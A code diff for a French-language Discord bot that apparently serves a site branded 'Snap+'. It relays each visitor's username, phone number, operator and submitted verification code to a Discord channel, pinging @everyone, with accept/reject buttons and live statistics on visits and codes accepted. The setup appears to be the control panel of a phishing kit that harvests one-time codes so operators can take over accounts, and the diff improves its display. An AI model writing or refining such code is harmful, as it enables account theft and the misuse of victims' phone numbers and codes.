@@ -1,10 +1,4 @@
-const {
-  Client,
-  GatewayIntentBits,
-  ActionRowBuilder,
-  ButtonBuilder,
-  ButtonStyle,
-} = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
 const { users, stats } = require('./store');
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
@@ -37,106 +31,43 @@ function getPercentage(value, total) {
   return ((value / total) * 100).toFixed(1);
 }
 
-// ======================= "RICH BLOCKS" => content text =======================
-// On simule le rendu de ton JSON par du texte structuré en content.
-function richTextFromBlocks(blocks) {
-  // blocks = [ { type: 10, content }, { type: 14, divider: true }, ... ]
-  let out = [];
-  for (const b of blocks) {
-    if (b.type === 10 && typeof b.content === 'string') out.push(b.content);
-    if (b.type === 14 && b.divider) out.push(SEPARATOR);
-    // spacing ignored (le rendu se fait avec sauts de ligne)
-  }
-  return out.join('\n');
-}
-
-function sendLikeNewInscription(username, phone, operator) {
-  return [
-    { type: 10, content: "# 📱 Nouvelle inscription Snap+" },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
-    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
-    { type: 10, content: `### 🏛️ Opérateur: ${operator || 'N/A'}` },
-    { type: 10, content: `### ⏰ Date: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: "En attente du code..." },
-  ];
-}
-
-function sendLikeCodeSubmitted(username, phone, code) {
-  return [
-    { type: 10, content: "# 🔒 Code de vérification soumis" },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
-    { type: 10, content: `### 🔢 Code saisi: \`${code}\`` },
-    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
-    { type: 10, content: `### 📅 Soumis à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: "En attente de validation par un modérateur" },
-  ];
-}
-
-function sendLikeAccept(username, phone, code, validatedBy) {
-  return [
-    { type: 10, content: "# ✅ Code validé" },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
-    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
-    { type: 10, content: `### 🔢 Code: \`${code}\`` },
-    { type: 10, content: `### 📅 Validé à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
-    { type: 10, content: `### ✅ Validé par: ${validatedBy}` },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: "*Utilisateur vérifié*" },
-  ];
-}
-
-function sendLikeReject(username, phone, code, rejectedBy) {
-  return [
-    { type: 10, content: "# 🔒 Code rejeté" },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
-    { type: 10, content: `### 🔢 Code saisi: \`${code || 'N/A'}\`` },
-    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
-    { type: 10, content: `### 📅 Rejeté à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
-    { type: 10, content: `### ❌ Rejeté par: ${rejectedBy}` },
-    { type: 14, divider: true, spacing: 2 },
-    { type: 10, content: "*L'utilisateur devra ressaisir le code*" },
-  ];
-}
-
-// ======================= "STATS" en content =======================
-function createStatsText() {
+// ======================= EMBED STATISTIQUES =======================
+function createStatsEmbed() {
   const uptime = formatUptime(Date.now() - stats.startTime);
   const STATS_SEPARATOR = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
-  return [
-    `${STATS_SEPARATOR}\n`,
-    `### 👥 **Visiteurs**`,
-    `🌐 **Total des visites:** \`${stats.totalVisits}\``,
-    `👤 **Visiteurs actuels:** \`${stats.currentVisitors}\``,
-    `🕐 **Dernière visite:** ${stats.lastVisit || 'Aucune'}`,
-    ``,
-    `### 📝 **Inscriptions**`,
-    `📱 **Total inscriptions:** \`${stats.totalRegistrations}\``,
-    `🕐 **Dernière inscription:** ${stats.lastRegistration || 'Aucune'}`,
-    ``,
-    `### 🔐 **Codes de vérification**`,
-    `📤 **Codes soumis:** \`${stats.totalCodesSubmitted}\``,
-    `✅ **Codes acceptés:** \`${stats.codesAccepted}\` (${getPercentage(stats.codesAccepted, stats.totalCodesSubmitted)}%)`,
-    `❌ **Codes rejetés:** \`${stats.codesRejected}\` (${getPercentage(stats.codesRejected, stats.totalCodesSubmitted)}%)`,
-    ``,
-    `### ⏱️ **Système**`,
-    `🟢 **Uptime:** ${uptime}`,
-    `���� **Dernière mise à jour:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
-    ``,
-    `${STATS_SEPARATOR}`,
-    ``,
-    `*🔄 Actualisation automatique toutes les 30 secondes*`,
-  ].join('\n');
+  return new EmbedBuilder()
+    .setColor('#FBFF00')
+    .setTitle('📊 Statistiques en temps réel - Snap+')
+    .setDescription(
+      `${STATS_SEPARATOR}\n\n` +
+      `### 👥 **Visiteurs**\n` +
+      `🌐 **Total des visites:** \`${stats.totalVisits}\`\n` +
+      `👤 **Visiteurs actuels:** \`${stats.currentVisitors}\`\n` +
+      `🕐 **Dernière visite:** ${stats.lastVisit || 'Aucune'}\n\n` +
+      
+      `### 📝 **Inscriptions**\n` +
+      `📱 **Total inscriptions:** \`${stats.totalRegistrations}\`\n` +
+      `🕐 **Dernière inscription:** ${stats.lastRegistration || 'Aucune'}\n\n` +
+      
+      `### 🔐 **Codes de vérification**\n` +
+      `📤 **Codes soumis:** \`${stats.totalCodesSubmitted}\`\n` +
+      `✅ **Codes acceptés:** \`${stats.codesAccepted}\` (${getPercentage(stats.codesAccepted, stats.totalCodesSubmitted)}%)\n` +
+      `❌ **Codes rejetés:** \`${stats.codesRejected}\` (${getPercentage(stats.codesRejected, stats.totalCodesSubmitted)}%)\n\n` +
+      
+      `### ⏱️ **Système**\n` +
+      `🟢 **Uptime:** ${uptime}\n` +
+      `🔄 **Dernière mise à jour:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n\n` +
+      
+      `${STATS_SEPARATOR}`
+    )
+    .setFooter({ text: '🔄 Actualisation automatique toutes les 30 secondes' })
+    .setTimestamp();
 }
 
 async function initStatsEmbed() {
   statsChannelId = process.env.STATS_CHANNEL_ID;
+  
   if (!statsChannelId) {
     console.warn('⚠️ STATS_CHANNEL_ID non défini dans .env - Stats désactivées');
     return;
@@ -144,25 +75,28 @@ async function initStatsEmbed() {
 
   try {
     const channel = await client.channels.fetch(statsChannelId);
-
+    
+    // Chercher un message existant
     const messages = await channel.messages.fetch({ limit: 10 });
-    const existingStats = messages.find(
-      (msg) => msg.author.id === client.user.id && (msg.content || '').includes('Statistiques en temps réel - Snap+')
+    const existingStats = messages.find(msg => 
+      msg.author.id === client.user.id && 
+      msg.embeds[0]?.title?.includes('📊')
     );
 
-    const text = `📊 Statistiques en temps réel - Snap+\n\n${createStatsText()}`;
+    const embed = createStatsEmbed();
 
     if (existingStats) {
-      await existingStats.edit({ content: text });
+      await existingStats.edit({ embeds: [embed] });
       statsMessageId = existingStats.id;
-      console.log('✅ Stats mises à jour');
+      console.log('✅ Embed de statistiques mis à jour');
     } else {
-      const msg = await channel.send({ content: text });
+      const msg = await channel.send({ embeds: [embed] });
       statsMessageId = msg.id;
-      console.log('✅ Stats créées');
+      console.log('✅ Embed de statistiques créé');
     }
 
-    setInterval(() => updateStatsMessage().catch(() => {}), 30000);
+    // Actualiser toutes les 30 secondes
+    setInterval(() => updateStatsMessage(), 30000);
   } catch (err) {
     console.error('❌ Erreur initialisation stats:', err);
   }
@@ -174,9 +108,8 @@ async function updateStatsMessage() {
   try {
     const channel = await client.channels.fetch(statsChannelId);
     const message = await channel.messages.fetch(statsMessageId);
-
-    const text = `📊 Statistiques en temps réel - Snap+\n\n${createStatsText()}`;
-    await message.edit({ content: text });
+    const embed = createStatsEmbed();
+    await message.edit({ embeds: [embed] });
   } catch (err) {
     console.error('❌ Erreur mise à jour stats:', err);
   }
@@ -185,17 +118,21 @@ async function updateStatsMessage() {
 // Fonction appelée par server.js pour mettre à jour les stats
 function updateStatsEmbed() {
   if (statsMessageId && statsChannelId) {
-    updateStatsMessage().catch(() => {});
+    updateStatsMessage().catch(err => {
+      // Silencieux si erreur (évite spam console)
+    });
   }
 }
 
 // ======================= BOT DISCORD =======================
 client.once('ready', () => {
   console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
+  
+  // Initialiser l'embed de statistiques après 2 secondes
   setTimeout(() => initStatsEmbed(), 2000);
 });
 
-client.on('interactionCreate', async (interaction) => {
+client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
 
   const [action, username] = interaction.customId.split(':');
@@ -208,17 +145,24 @@ client.on('interactionCreate', async (interaction) => {
   if (action === 'accept') {
     user.status = 'verified';
 
-    const embedText = richTextFromBlocks(
-      sendLikeAccept(username, user.phone, user.submittedCode, interaction.user.tag)
-    );
+    const embed = new EmbedBuilder()
+      .setColor('#2ecc71')
+      .setDescription(
+        `# ✅ Code validé\n` +
+        `${SEPARATOR}\n` +
+        `### 👤 **Nom d'utilisateur:** ${username}\n` +
+        `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+        `### 🔢 **Code:** \`${user.submittedCode}\`\n` +
+        `### 📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+        `### ✅ **Validé par:** ${interaction.user.tag}\n` +
+        `${SEPARATOR}\n` +
+        `*Utilisateur vérifié*`
+      );
 
+    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
+    
+    // Mise à jour des stats
     stats.codesAccepted++;
-
-    await interaction.update({
-      content: embedText,
-      components: [],
-    });
-
     updateStatsEmbed();
   }
 
@@ -227,51 +171,71 @@ client.on('interactionCreate', async (interaction) => {
     const rejectedCode = user.submittedCode;
     user.submittedCode = null;
 
-    const embedText = richTextFromBlocks(
-      sendLikeReject(username, user.phone, rejectedCode, interaction.user.tag)
-    );
+    const embed = new EmbedBuilder()
+      .setColor('#e74c3c')
+      .setDescription(
+        `# 🔒 Code rejeté\n` +
+        `${SEPARATOR}\n` +
+        `### 👤 **Nom d'utilisateur:** ${username}\n` +
+        `### 🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
+        `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+        `### 📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+        `### ❌ **Rejeté par:** ${interaction.user.tag}\n` +
+        `${SEPARATOR}\n` +
+        `*L'utilisateur devra ressaisir le code*`
+      );
 
+    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
+    
+    // Mise à jour des stats
     stats.codesRejected++;
-
-    await interaction.update({
-      content: embedText,
-      components: [],
-    });
-
     updateStatsEmbed();
   }
 });
 
-// ======================= EXPORTS (appelés par server.js) =======================
 async function sendInitialEmbed(username, phone) {
   const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
   const user = users[username];
 
-  const blocks = sendLikeNewInscription(username, phone, user?.operator);
-  const text = richTextFromBlocks(blocks);
+  const embed = new EmbedBuilder()
+    .setColor('#2b2d31')
+    .setDescription(
+      `# 📱 Nouvelle inscription Snap+\n` +
+      `${SEPARATOR}\n` +
+      `### 👤 **Nom d'utilisateur:** ${username}\n` +
+      `### 📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
+      `### 🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
+      `### ⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+      `${SEPARATOR}\n` +
+      `*En attente du code...*`
+    );
 
-  await channel.send({ content: '@everyone\n\n' + text });
+  await channel.send({ content: '@everyone', embeds: [embed] });
 }
 
 async function sendCodeEmbed(username) {
   const user = users[username];
   const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
 
-  const blocks = sendLikeCodeSubmitted(username, user.phone, user.submittedCode);
-  const text = richTextFromBlocks(blocks);
+  const embed = new EmbedBuilder()
+    .setColor('#f1c40f')
+    .setDescription(
+      `# 🔒 Code de vérification soumis\n` +
+      `${SEPARATOR}\n` +
+      `### 👤 **Nom d'utilisateur:** ${username}\n` +
+      `### 🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
+      `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+      `### 📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+      `${SEPARATOR}\n` +
+      `*En attente de validation par un modérateur*`
+    );
 
   const row = new ActionRowBuilder().addComponents(
-    new ButtonBuilder()
-      .setCustomId(`accept:${username}`)
-      .setLabel('Accepter')
-      .setStyle(ButtonStyle.Success),
-    new ButtonBuilder()
-      .setCustomId(`reject:${username}`)
-      .setLabel('Refuser')
-      .setStyle(ButtonStyle.Danger)
+    new ButtonBuilder().setCustomId(`accept:${username}`).setLabel('Accepter').setStyle(ButtonStyle.Success),
+    new ButtonBuilder().setCustomId(`reject:${username}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
   );
 
-  await channel.send({ content: '@everyone\n\n' + text, components: [row] });
+  await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
 }
 
 client.login(process.env.BOT_TOKEN);
